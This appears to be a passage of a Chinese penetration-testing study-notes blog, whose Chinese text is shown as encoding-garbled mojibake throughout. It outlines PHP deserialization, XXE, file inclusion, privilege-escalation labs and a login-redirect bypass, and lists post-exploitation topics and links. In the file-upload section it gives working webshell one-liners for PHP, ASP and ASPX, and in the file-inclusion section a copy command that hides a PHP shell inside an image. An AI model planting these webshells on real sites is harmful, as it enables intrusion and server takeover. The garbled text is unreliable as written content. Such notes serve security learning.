title="PHPååºåˆ—åŒ–"></a>PHPååºåˆ—åŒ–</h3></li></ul><p>è¿™æ˜¯æ ¹æ®ä»£ç å®¡è®¡å‡ºæ¥çš„ï¼Œåªèƒ½ç›²çŒœ</p><p>é­”æœ¯æ–¹æ³•éƒ½æ˜¯ç”¨__å¼€å¤´çš„ï¼š</p><p>__constructï¼šæ„é€ å‡½æ•°ï¼Œå½“å¯¹è±¡åˆ›å»ºï¼ˆnewï¼‰æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ï¼Œunserializeååºåˆ—åŒ–æ—¶æ˜¯ä¸ä¼šè¢«è‡ªåŠ¨è°ƒç”¨çš„</p><p>__destructï¼šææ„å‡½æ•°ï¼Œå½“å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚</p><p>__wakeupï¼š</p><p>unserialize()æ—¶ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨__wakeup()ï¼Œå¦‚æœçº¯åœ¨ï¼Œåˆ™ä¼šæ‚ é—²è°ƒç”¨ã€‚</p><p>__sleep():ç”¨äºæäº¤æœªæäº¤çš„æ•°æ®ï¼Œæˆ–è•¾è¥¿çš„æ¸…ç†æ“ä½œï¼Œå› æ­¤å½“ä¸€ä¸ªå¯¹è±¡è¢«åºåˆ—åŒ–çš„æ—¶å€™è¢«è°ƒç”¨ </p><ul><li><h3 id="XXEå¤–éƒ¨å®ä½“æ³¨å…¥"><a href="#XXEå¤–éƒ¨å®ä½“æ³¨å…¥" class="headerlink" title="XXEå¤–éƒ¨å®ä½“æ³¨å…¥"></a>XXEå¤–éƒ¨å®ä½“æ³¨å…¥</h3><h4 id="ç†Ÿæ‚‰XMLå®šä¹‰ï¼š"><a href="#ç†Ÿæ‚‰XMLå®šä¹‰ï¼š" class="headerlink" title="ç†Ÿæ‚‰XMLå®šä¹‰ï¼š"></a>ç†Ÿæ‚‰XMLå®šä¹‰ï¼š</h4></li></ul><p><a href="https://blog.csdn.net/github_36086968/article/details/93044993" target="_blank" rel="noopener">XMLå®šä¹‰ï¼Œè¯­æ³•ï¼Œè§£æå­¦ä¹ </a></p><h4 id="ç†è§£DTDçš„ä½œç”¨ï¼š"><a href="#ç†è§£DTDçš„ä½œç”¨ï¼š" class="headerlink" title="ç†è§£DTDçš„ä½œç”¨ï¼š"></a>ç†è§£DTDçš„ä½œç”¨ï¼š</h4><h4 id="ç†è§£XXEåŸç†ï¼š"><a href="#ç†è§£XXEåŸç†ï¼š" class="headerlink" title="ç†è§£XXEåŸç†ï¼š"></a>ç†è§£XXEåŸç†ï¼š</h4><h4 id="æŒæ¡XXEåˆ©ç”¨æ–¹å¼ï¼š"><a href="#æŒæ¡XXEåˆ©ç”¨æ–¹å¼ï¼š" class="headerlink" title="æŒæ¡XXEåˆ©ç”¨æ–¹å¼ï¼š"></a>æŒæ¡XXEåˆ©ç”¨æ–¹å¼ï¼š</h4><ul><li><h3 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h3></li></ul><h4 id="æ¼æ´äº§ç”ŸåŸå› "><a href="#æ¼æ´äº§ç”ŸåŸå› " class="headerlink" title="æ¼æ´äº§ç”ŸåŸå› "></a><a href="https://blog.csdn.net/weixin_45116657/article/details/100602769" target="_blank" rel="noopener">æ¼æ´äº§ç”ŸåŸå› </a></h4><h4 id="åŒ…å«å‡½æ•°ä»‹ç»ï¼š"><a href="#åŒ…å«å‡½æ•°ä»‹ç»ï¼š" class="headerlink" title="åŒ…å«å‡½æ•°ä»‹ç»ï¼š"></a>åŒ…å«å‡½æ•°ä»‹ç»ï¼š</h4><h5 id="include"><a href="#include" class="headerlink" title="include():"></a>include():</h5><p>å½“ä½¿ç”¨è¯¥å‡½æ•°åŒ…å«æ–‡ä»¶æ—¶ï¼Œåªæœ‰ä»£ç æ‰§è¡Œåˆ°include()å‡½æ•°æ—¶æ‰å°†æ–‡ä»¶åŒ…å«è¿›æ¥ï¼Œå‘ç”Ÿé”™è¯¯æ—¶åªç»™å‡ºä¸€ä¸ªè­¦å‘Šï¼Œç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚</p><h5 id="include-once"><a href="#include-once" class="headerlink" title="include_once():"></a>include_once():</h5><p>åŠŸèƒ½å’Œinclude()ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡ã€‚</p><h5 id="require"><a href="#require" class="headerlink" title="require():"></a>require():</h5><p>require()ä¸include()çš„åŒºåˆ«åœ¨äºrequire()æ‰§è¡Œå¦‚æœå‘ç”Ÿé”™è¯¯ï¼Œå‡½æ•°ä¼šè¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼Œå¹¶ç»ˆæ­¢è„šæœ¬çš„è¿è¡Œã€‚<br>ä½¿ç”¨require()å‡½æ•°åŒ…å«æ–‡ä»¶æ—¶ï¼Œåªè¦ç¨‹åºä¸€æ‰§è¡Œï¼Œç«‹å³è°ƒç”¨æ–‡ä»¶ï¼Œè€Œinclude()åªæœ‰ç¨‹åºæ‰§è¡Œåˆ°è¯¥å‡½æ•°æ—¶æ‰è°ƒç”¨ã€‚</p><h5 id="require-once"><a href="#require-once" class="headerlink" title="require_once():"></a>require_once():</h5><p>å®ƒçš„åŠŸèƒ½ä¸require()ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡ã€‚</p><h5 id="åˆ©ç”¨copyåˆæˆä¸€ä¸ªä¸€å¥è¯å›¾ç‰‡é©¬-batï¼š"><a href="#åˆ©ç”¨copyåˆæˆä¸€ä¸ªä¸€å¥è¯å›¾ç‰‡é©¬-batï¼š" class="headerlink" title="åˆ©ç”¨copyåˆæˆä¸€ä¸ªä¸€å¥è¯å›¾ç‰‡é©¬.batï¼š"></a>åˆ©ç”¨copyåˆæˆä¸€ä¸ªä¸€å¥è¯å›¾ç‰‡é©¬.batï¼š</h5><p>copy 1.jpg/b + help.php/a help.jpg</p><ul><li><h3 id="ä¸šåŠ¡é€»è¾‘æ¼æ´"><a href="#ä¸šåŠ¡é€»è¾‘æ¼æ´" class="headerlink" title="ä¸šåŠ¡é€»è¾‘æ¼æ´"></a>ä¸šåŠ¡é€»è¾‘æ¼æ´</h3></li></ul><h4 id="ä¸šåŠ¡æ¥å£è°ƒç”¨"><a href="#ä¸šåŠ¡æ¥å£è°ƒç”¨" class="headerlink" title="ä¸šåŠ¡æ¥å£è°ƒç”¨"></a><a href="https://blog.csdn.net/fageweiketang/article/details/81668329" target="_blank" rel="noopener">ä¸šåŠ¡æ¥å£è°ƒç”¨</a></h4><h4 id="æœªæˆæƒè®¿é—®"><a href="#æœªæˆæƒè®¿é—®" class="headerlink" title="æœªæˆæƒè®¿é—®"></a>æœªæˆæƒè®¿é—®</h4><h4 id="è¶Šæƒæ¼æ´ï¼šå‚ç›´ã€å¹³è¡Œè¶Šæƒ"><a href="#è¶Šæƒæ¼æ´ï¼šå‚ç›´ã€å¹³è¡Œè¶Šæƒ" class="headerlink" title="è¶Šæƒæ¼æ´ï¼šå‚ç›´ã€å¹³è¡Œè¶Šæƒ"></a>è¶Šæƒæ¼æ´ï¼šå‚ç›´ã€å¹³è¡Œè¶Šæƒ</h4><h4 id="èº«ä»½è®¤è¯å®‰å…¨ï¼šsessionä¼šè¯å›ºå®šæ”»å‡»ã€cookieä»¿å†’"><a href="#èº«ä»½è®¤è¯å®‰å…¨ï¼šsessionä¼šè¯å›ºå®šæ”»å‡»ã€cookieä»¿å†’" class="headerlink" title="èº«ä»½è®¤è¯å®‰å…¨ï¼šsessionä¼šè¯å›ºå®šæ”»å‡»ã€cookieä»¿å†’"></a>èº«ä»½è®¤è¯å®‰å…¨ï¼šsessionä¼šè¯å›ºå®šæ”»å‡»ã€cookieä»¿å†’</h4><h4 id="å¯†ç æ‰¾å›å®‰å…¨"><a href="#å¯†ç æ‰¾å›å®‰å…¨" class="headerlink" title="å¯†ç æ‰¾å›å®‰å…¨"></a>å¯†ç æ‰¾å›å®‰å…¨</h4><h4 id="pikachuå®æˆ˜æ¼”ç»ƒè¶Šæƒï¼š"><a href="#pikachuå®æˆ˜æ¼”ç»ƒè¶Šæƒï¼š" class="headerlink" title="pikachuå®æˆ˜æ¼”ç»ƒè¶Šæƒï¼š"></a>pikachuå®æˆ˜æ¼”ç»ƒè¶Šæƒï¼š</h4><p>é€šè¿‡æŠ“å–lucyçš„ä¸ªäººä¿¡æ¯ï¼Œå°†å…¶æ”¹ä¸ºliliï¼Œæ—¢å¯ä»¥å®ç°<strong>æ°´å¹³è¶Šæƒ</strong></p><p>é€šè¿‡ç®¡ç†å‘˜çš„å¢åŠ ç”¨æˆ·åŠŸèƒ½çš„URLï¼Œåœ¨ç™»é™†åˆ°pikaichuç”¨æˆ·çš„æƒ…å†µä¸‹è¿›è¡Œè®¿é—®ï¼Œå°±å¯ä»¥å®ç°å‚ç›´è¶Šæƒ</p><ul><li><h3 id="corså’Œjsonpè·¨åŸŸ"><a href="#corså’Œjsonpè·¨åŸŸ" class="headerlink" title="corså’Œjsonpè·¨åŸŸ"></a>corså’Œjsonpè·¨åŸŸ</h3></li></ul><h4 id="åŒæºç­–ç•¥ä»‹ç»ï¼š"><a href="#åŒæºç­–ç•¥ä»‹ç»ï¼š" class="headerlink" title="åŒæºç­–ç•¥ä»‹ç»ï¼š"></a><a href="https://blog.csdn.net/qq_36028303/article/details/80477193" target="_blank" rel="noopener">åŒæºç­–ç•¥ä»‹ç»</a>ï¼š</h4><p>ç›¸åŒçš„åè®®ã€ç›¸åŒçš„åŸŸåã€ç›¸åŒçš„ç«¯å£</p><ul><li><h3 id="è§£ææ¼æ´"><a href="#è§£ææ¼æ´" class="headerlink" title="è§£ææ¼æ´"></a><a href="https://segmentfault.com/a/1190000016026991" target="_blank" rel="noopener">è§£ææ¼æ´</a></h3></li></ul><p><a href="https://blog.csdn.net/weixin_43625577/article/details/91971796" target="_blank" rel="noopener">å¸¸è§çš„è§£ææ¼æ´æ€»ç»“</a></p><ul><li><h3 id="å…¶ä»–æ¼æ´"><a href="#å…¶ä»–æ¼æ´" class="headerlink" title="å…¶ä»–æ¼æ´"></a>å…¶ä»–æ¼æ´</h3></li></ul><h4 id="IIS-PUT-æ¼æ´ï¼š"><a href="#IIS-PUT-æ¼æ´ï¼š" class="headerlink" title="IIS PUT æ¼æ´ï¼š"></a>IIS PUT æ¼æ´ï¼š</h4><p><a href="https://blog.csdn.net/XZ_______/article/details/111417967?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161759244516780264012132%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161759244516780264012132&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-4-111417967.first_rank_v2_pc_rank_v29&utm_term=IIS%2BPUT%2B%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">å¤ç°IIS PUTä»»æ„ä¸Šä¼ æ¼æ´(è¿‡ç¨‹ï¼Œæ­¥éª¤ï¼Œè¯´æ˜)</a>è€æ¼æ´äº†</p><h4 id="å¿ƒè„æ»´è¡€æ¼æ´"><a href="#å¿ƒè„æ»´è¡€æ¼æ´" class="headerlink" title="å¿ƒè„æ»´è¡€æ¼æ´"></a><a href="https://blog.csdn.net/lixue20141529/article/details/77815979" target="_blank" rel="noopener">å¿ƒè„æ»´è¡€æ¼æ´</a></h4><h4 id="ä»»æ„æ–‡ä»¶è¯»å–ä¸ä¸‹è½½"><a href="#ä»»æ„æ–‡ä»¶è¯»å–ä¸ä¸‹è½½" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–ä¸ä¸‹è½½"></a><a href="https://blog.csdn.net/weixin_34281477/article/details/92134033" target="_blank" rel="noopener">ä»»æ„æ–‡ä»¶è¯»å–ä¸ä¸‹è½½</a></h4><ul><li><h3 id="æˆæƒè®¿é—®"><a href="#æˆæƒè®¿é—®" class="headerlink" title="æˆæƒè®¿é—®"></a>æˆæƒè®¿é—®</h3></li></ul><h4 id="1-æœªæˆæƒè®¿é—®æ¼æ´ä»‹ç»"><a href="#1-æœªæˆæƒè®¿é—®æ¼æ´ä»‹ç»" class="headerlink" title="1.æœªæˆæƒè®¿é—®æ¼æ´ä»‹ç»"></a>1.æœªæˆæƒè®¿é—®æ¼æ´ä»‹ç»</h4><p><a href="https://blog.csdn.net/weixin_45439698/article/details/97672717?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161760573516780269840135%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161760573516780269840135&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-97672717.first_rank_v2_pc_rank_v29&utm_term=%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE" target="_blank" rel="noopener">æœªæˆæƒè®¿é—®æ¼æ´æ€»ç»“</a></p><h4 id="2-webç«¯æœªæˆæƒè®¿é—®ï¼š"><a href="#2-webç«¯æœªæˆæƒè®¿é—®ï¼š" class="headerlink" title="2.webç«¯æœªæˆæƒè®¿é—®ï¼š"></a>2.webç«¯æœªæˆæƒè®¿é—®ï¼š</h4><p>æ¡ˆä¾‹ä¸€ï¼šè¿”å›åŒ…æ”¹çŠ¶æ€ç ä¸åˆ é™¤é‡å®šå‘å­—æ®µï¼ˆåœ¨é¢å¯¹ä¸€é—ªè€Œè¿‡çš„é‡å®šå‘çš„é¡µé¢æ—¶ï¼‰</p><p>æ­¥éª¤ä¸€ï¼šURLè¾“å…¥ /admin/main.phpæŠ“åŒ…</p><p>æ­¥éª¤äºŒï¼šçŠ¶æ€ç 302æ”¹ä¸º200ï¼Œåˆ é™¤é‡å®šå‘locationå­—æ®µ</p><p>ç›®çš„ï¼šç›´æ¥è®¿é—®åå°æ–‡ä»¶ç³»ç»Ÿä¼šåˆ¤æ–­æ˜¯å¦ç™»å½•ï¼Œæœªç™»å½•ä¼šè·³è½¬åˆ°ç™»å½•é¡µé¢ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åˆ é™¤è·³è½¬å†…å®¹ï¼Œç•™åœ¨åå°ç•Œé¢ï¼Œè¿›è¡Œæ“ä½œã€‚</p><p>æˆ–è€…æ‰¾åˆ°è·³è½¬æ ‡ç­¾å°†å…¶åˆ é™¤æ‰ï¼š&lt;meta(æ¡ˆä¾‹äºŒ)</p><p>æ­¥éª¤ä¸‰ï¼šç„¶åæˆ‘ä»¬å°±å¯ä»¥åœ¨åå°å¢åˆ æ”¹æŸ¥å†…å®¹</p><p>æ¡ˆä¾‹ä¸‰ï¼šjsæ‹¦æˆª </p><p>é’ˆå¯¹å¼¹çª—æ‹¦æˆªå°±æ˜¯jsæ‹¦æˆªï¼Œåˆ é™¤è·³è½¬jsæ ‡ç­¾</p><p><a href="https://blog.csdn.net/qq_41679358/article/details/108227070?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161760599716780255257025%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161760599716780255257025&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-108227070.first_rank_v2_pc_rank_v29&utm_term=%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%A1%88%E4%BE%8B" target="_blank" rel="noopener">Redisæœªæˆæƒè®¿é—®æ¼æ´åŸç†åŠå¤ç°</a></p><p><a href="https://blog.csdn.net/Aaron_Miller/article/details/107822500?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161761058516780269877015%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161761058516780269877015&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-107822500.first_rank_v2_pc_rank_v29&utm_term=rsync%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0" target="_blank" rel="noopener">rsyncæœªæˆæƒè®¿é—®æ¼æ´åŸç†åŠå¤ç°</a></p><ul><li><h3 id="æ–‡ä»¶ä¸Šä¼ -amp-ç¼–è¾‘å™¨"><a href="#æ–‡ä»¶ä¸Šä¼ -amp-ç¼–è¾‘å™¨" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ &amp;ç¼–è¾‘å™¨"></a>æ–‡ä»¶ä¸Šä¼ &amp;ç¼–è¾‘å™¨</h3></li></ul><p>webshellæ˜¯ä¸€ç§ç½‘ç«™åé—¨æœ¨é©¬ï¼Œä¹Ÿæ˜¯ä¸€ç§ç½‘é¡µç‰ˆçš„å‘½ä»¤è§£é‡Šå™¨ï¼Œé€šè¿‡HTTP(s)åè®®é€šä¿¡ï¼Œå¹¶ä¸”ç»§æ‰¿äº†webç”¨æˆ·çš„æƒé™</p><h4 id="ä¸€å¥è¯æœ¨é©¬ï¼š"><a href="#ä¸€å¥è¯æœ¨é©¬ï¼š" class="headerlink" title="ä¸€å¥è¯æœ¨é©¬ï¼š"></a><a href="https://blog.csdn.net/weixin_39190897/article/details/86772765?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161761382616780274188830%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161761382616780274188830&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-86772765.first_rank_v2_pc_rank_v29&utm_term=%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC" target="_blank" rel="noopener">ä¸€å¥è¯æœ¨é©¬ï¼š</a></h4><pre><code>phpçš„ä¸€å¥è¯æœ¨é©¬ï¼š &lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;aspçš„ä¸€å¥è¯æ˜¯ï¼š   &lt;%eval request (&quot;pass&quot;)%&gt;aspxçš„ä¸€å¥è¯æ˜¯ï¼š  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</code></pre><p>phpä¸€å¥è¯æœ¨é©¬ä¸­çš„@æ˜¯ä¸ºäº†ä¸æŠ¥é”™</p><p>dvwahighç­‰çº§çš„é…åˆç»„åˆæ‹³ï¼šç»“åˆæ–‡ä»¶åŒ…å«æ¼æ´æ¥è§¦å‘ä¸Šä¼ çš„å›¾ç‰‡çš„é©¬</p><p>é’ˆå¯¹äºå‰ç«¯çš„ç»•è¿‡å¯ä»¥ç›´æ¥åˆ æ‰jsä»£ç </p><ul><li><h3 id="APPæµ‹è¯•"><a href="#APPæµ‹è¯•" class="headerlink" title="APPæµ‹è¯•"></a>APPæµ‹è¯•</h3></li><li><h3 id="AWVSã€Nessus"><a href="#AWVSã€Nessus" class="headerlink" title="AWVSã€Nessus"></a>AWVSã€Nessus</h3></li><li><h3 id="MSFå’Œæ°¸æ’ä¹‹è“"><a href="#MSFå’Œæ°¸æ’ä¹‹è“" class="headerlink" title="MSFå’Œæ°¸æ’ä¹‹è“"></a>MSFå’Œæ°¸æ’ä¹‹è“</h3></li><li><h3 id="å¸¸è§CMSæ¼æ´å¤ç°"><a href="#å¸¸è§CMSæ¼æ´å¤ç°" class="headerlink" title="å¸¸è§CMSæ¼æ´å¤ç°"></a>å¸¸è§CMSæ¼æ´å¤ç°</h3></li><li><h3 id="æ¡†æ¶å’Œä¸­é—´ä»¶æ¼æ´"><a href="#æ¡†æ¶å’Œä¸­é—´ä»¶æ¼æ´" class="headerlink" title="æ¡†æ¶å’Œä¸­é—´ä»¶æ¼æ´"></a>æ¡†æ¶å’Œä¸­é—´ä»¶æ¼æ´</h3></li></ul><h2 id="3-åæ¸—é€ç¯‡"><a href="#3-åæ¸—é€ç¯‡" class="headerlink" title="3.åæ¸—é€ç¯‡"></a>3.åæ¸—é€ç¯‡</h2><ul><li><h3 id="Windowsææƒ"><a href="#Windowsææƒ" class="headerlink" title="Windowsææƒ"></a>Windowsææƒ</h3></li><li><h3 id="Linuxææƒ"><a href="#Linuxææƒ" class="headerlink" title="Linuxææƒ"></a>Linuxææƒ</h3></li><li><h3 id="æµé‡æ˜ å°„ç«¯å£åå¼¹"><a href="#æµé‡æ˜ å°„ç«¯å£åå¼¹" class="headerlink" title="æµé‡æ˜ å°„ç«¯å£åå¼¹"></a>æµé‡æ˜ å°„ç«¯å£åå¼¹</h3></li><li><h3 id="Windowsæƒé™ç»´æŒ"><a href="#Windowsæƒé™ç»´æŒ" class="headerlink" title="Windowsæƒé™ç»´æŒ"></a>Windowsæƒé™ç»´æŒ</h3></li><li><h3 id="Linuxæƒé™ç»´æŒ"><a href="#Linuxæƒé™ç»´æŒ" class="headerlink" title="Linuxæƒé™ç»´æŒ"></a>Linuxæƒé™ç»´æŒ</h3></li><li><h3 id="æ¸—é€çš„æœ¬è´¨"><a href="#æ¸—é€çš„æœ¬è´¨" class="headerlink" title="æ¸—é€çš„æœ¬è´¨"></a>æ¸—é€çš„æœ¬è´¨</h3></li><li><h4 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h4></li><li><h3 id="åå¼¹shellæ–¹æ³•æ±‡æ€»"><a href="#åå¼¹shellæ–¹æ³•æ±‡æ€»" class="headerlink" title="åå¼¹shellæ–¹æ³•æ±‡æ€»"></a>åå¼¹shellæ–¹æ³•æ±‡æ€»</h3></li><li><h3 id="Windowsæƒé™åˆ†æ"><a href="#Windowsæƒé™åˆ†æ" class="headerlink" title="Windowsæƒé™åˆ†æ"></a>Windowsæƒé™åˆ†æ</h3></li><li><h3 id="Windows-bypassUAC"><a href="#Windows-bypassUAC" class="headerlink" title="Windows bypassUAC"></a>Windows bypassUAC</h3></li><li><h3 id="Windowsæœ¬åœ°ä¾¦æŸ¥"><a href="#Windowsæœ¬åœ°ä¾¦æŸ¥" class="headerlink" title="Windowsæœ¬åœ°ä¾¦æŸ¥"></a>Windowsæœ¬åœ°ä¾¦æŸ¥</h3></li><li><h3 id="Windowså†…æ ¸ææƒ"><a href="#Windowså†…æ ¸ææƒ" class="headerlink" title="Windowså†…æ ¸ææƒ"></a>Windowså†…æ ¸ææƒ</h3></li><li><h3 id="Windowsææƒ-1"><a href="#Windowsææƒ-1" class="headerlink" title="Windowsææƒ"></a>Windowsææƒ</h3></li><li><h3 id="Linuxææƒ-1"><a href="#Linuxææƒ-1" class="headerlink" title="Linuxææƒ"></a>Linuxææƒ</h3></li><li><h3 id="MetasploitåŸºæœ¬ä½¿ç”¨"><a href="#MetasploitåŸºæœ¬ä½¿ç”¨" class="headerlink" title="MetasploitåŸºæœ¬ä½¿ç”¨"></a>MetasploitåŸºæœ¬ä½¿ç”¨</h3></li><li><h3 id="Metasploit-linuxä»¥åŠwindowsæœ¨é©¬æ§åˆ¶"><a href="#Metasploit-linuxä»¥åŠwindowsæœ¨é©¬æ§åˆ¶" class="headerlink" title="Metasploit linuxä»¥åŠwindowsæœ¨é©¬æ§åˆ¶"></a>Metasploit linuxä»¥åŠwindowsæœ¨é©¬æ§åˆ¶</h3></li><li><h3 id="linuxæƒé™ç»´æŒ"><a href="#linuxæƒé™ç»´æŒ" class="headerlink" title="linuxæƒé™ç»´æŒ"></a>linuxæƒé™ç»´æŒ</h3></li><li><h3 id="Windowsæƒé™ç»´æŒ-1"><a href="#Windowsæƒé™ç»´æŒ-1" class="headerlink" title="Windowsæƒé™ç»´æŒ"></a>Windowsæƒé™ç»´æŒ</h3></li></ul><h2 id="4-Python"><a href="#4-Python" class="headerlink" title="4.Python"></a>4.Python</h2><ul><li><h3 id="ç¬¬ä¸€å¤©"><a href="#ç¬¬ä¸€å¤©" class="headerlink" title="ç¬¬ä¸€å¤©"></a>ç¬¬ä¸€å¤©</h3></li><li><h3 id="ç¬¬äºŒå¤©"><a href="#ç¬¬äºŒå¤©" class="headerlink" title="ç¬¬äºŒå¤©"></a>ç¬¬äºŒå¤©</h3></li><li><h3 id="ç¬¬ä¸‰å¤©"><a href="#ç¬¬ä¸‰å¤©" class="headerlink" title="ç¬¬ä¸‰å¤©"></a>ç¬¬ä¸‰å¤©</h3></li><li><h3 id="ç¬¬å››å¤©"><a href="#ç¬¬å››å¤©" class="headerlink" title="ç¬¬å››å¤©"></a>ç¬¬å››å¤©</h3></li><li><h3 id="ç¬¬äº”å¤©çˆ¬è™«"><a href="#ç¬¬äº”å¤©çˆ¬è™«" class="headerlink" title="ç¬¬äº”å¤©çˆ¬è™«"></a>ç¬¬äº”å¤©çˆ¬è™«</h3></li><li><h3 id="pythonç¼–å†™phpstudy-poc"><a href="#pythonç¼–å†™phpstudy-poc" class="headerlink" title="pythonç¼–å†™phpstudy_poc"></a>pythonç¼–å†™phpstudy_poc</h3></li><li><h3 id="æ¸—é€æµ‹è¯•æµç¨‹andæŠ¥å‘Šç¼–å†™"><a href="#æ¸—é€æµ‹è¯•æµç¨‹andæŠ¥å‘Šç¼–å†™" class="headerlink" title="æ¸—é€æµ‹è¯•æµç¨‹andæŠ¥å‘Šç¼–å†™"></a>æ¸—é€æµ‹è¯•æµç¨‹andæŠ¥å‘Šç¼–å†™</h3></li></ul><h2 id="5-SRCæ¼æ´æŒ–æ˜"><a href="#5-SRCæ¼æ´æŒ–æ˜" class="headerlink" title="5.SRCæ¼æ´æŒ–æ˜"></a>5.SRCæ¼æ´æŒ–æ˜</h2><ul><li><h3 id="SRCä¿¡æ¯æ”¶é›†é€šå…³ä¹‹è·¯"><a href="#SRCä¿¡æ¯æ”¶é›†é€šå…³ä¹‹è·¯" class="headerlink" title="SRCä¿¡æ¯æ”¶é›†é€šå…³ä¹‹è·¯"></a>SRCä¿¡æ¯æ”¶é›†é€šå…³ä¹‹è·¯</h3></li><li><h3 id="SRCä¸šåŠ¡æ¼æ´åˆ†ç±»æŒ–æ˜"><a href="#SRCä¸šåŠ¡æ¼æ´åˆ†ç±»æŒ–æ˜" class="headerlink" title="SRCä¸šåŠ¡æ¼æ´åˆ†ç±»æŒ–æ˜"></a>SRCä¸šåŠ¡æ¼æ´åˆ†ç±»æŒ–æ˜</h3></li></ul><h2 id="6-ä¸²è®²"><a href="#6-ä¸²è®²" class="headerlink" title="6.ä¸²è®²"></a>6.ä¸²è®²</h2><h3 id="2021-3-30ï¼š"><a href="#2021-3-30ï¼š" class="headerlink" title="2021-3-30ï¼š"></a>2021-3-30ï¼š</h3><h4 id="åº”æ€¥å“åº”ï¼š"><a href="#åº”æ€¥å“åº”ï¼š" class="headerlink" title="åº”æ€¥å“åº”ï¼š"></a>åº”æ€¥å“åº”ï¼š</h4><p><strong><a href="https://www.freebuf.com/column/178677.html" target="_blank" rel="noopener">ã€åº”æ€¥å“åº”ã€‘windowså…¥ä¾µæ’æŸ¥æ€è·¯</a></strong></p><p><a href="https://blog.csdn.net/weixin_44840696/article/details/90142992?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161708352316780357270687%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161708352316780357270687&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~top_positive~default-1-90142992.nonecase&utm_term=%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94" target="_blank" rel="noopener"><strong>åº”æ€¥å“åº”æµç¨‹</strong></a></p><p><a href="https://github.com/Bypass007" target="_blank" rel="noopener">https://github.com/Bypass007</a></p><p><strong>sqlæ³¨å…¥åŸç†ï¼š</strong>SQLæ³¨å…¥æ˜¯æŒ‡Webåº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·è¾“å…¥æ•°æ®çš„åˆæ³•æ€§æœªè¿›è¡Œåˆ¤æ–­ã€å¤„ç†ï¼Œå‰ç«¯ä¼ å…¥çš„å‚æ•°æ˜¯æ”»å‡»è€…å¯æ§çš„ï¼Œå¹¶ä¸”å‚æ•°è¢«æ­£å¸¸çš„å¸¦å…¥åˆ°æ•°æ®åº“æŸ¥è¯¢ï¼Œå°±å¯¼è‡´äº†sqlæ³¨å…¥æ¼æ´çš„å‡ºç°</p><p><strong>xssåŸç†</strong>ï¼šæ˜¯WEBåº”ç”¨ç¨‹åºæ··æ·†äº†ç”¨æˆ·æäº¤çš„æ•°æ®å’ŒJSè„šæœ¬çš„ä»£ç è¾¹ç•Œï¼Œå¯¼è‡´æµè§ˆå™¨æŠŠç”¨æˆ·çš„è¾“å…¥å½“æˆäº†JSä»£ç æ¥æ‰§è¡Œã€‚xssçš„æ”»å‡»å¯¹è±¡æ˜¯æµè§ˆå™¨ä¸€ç«¯çš„æ™®é€šç”¨æˆ·ã€‚</p><p><a href="https://www.freebuf.com/vuls/251028.html" target="_blank" rel="noopener"><strong>SQLæ³¨å…¥WAFç»•è¿‡</strong></a></p><h4 id="hfishèœœç½æ­å»ºï¼š"><a href="#hfishèœœç½æ­å»ºï¼š" class="headerlink" title="hfishèœœç½æ­å»ºï¼š"></a>hfishèœœç½æ­å»ºï¼š</h4><p><a href="https://github.com/secoba/HFish" target="_blank" rel="noopener">ä¼ä¸šå®‰å…¨æµ‹è¯•ä¸»åŠ¨æ”»å‡»å‹èœœç½é’“é±¼æ¡†æ¶ç³»ç»Ÿ</a></p><p><a href="https://github.com/hacklcx/hfish/releasesåŒä¸Š" target="_blank" 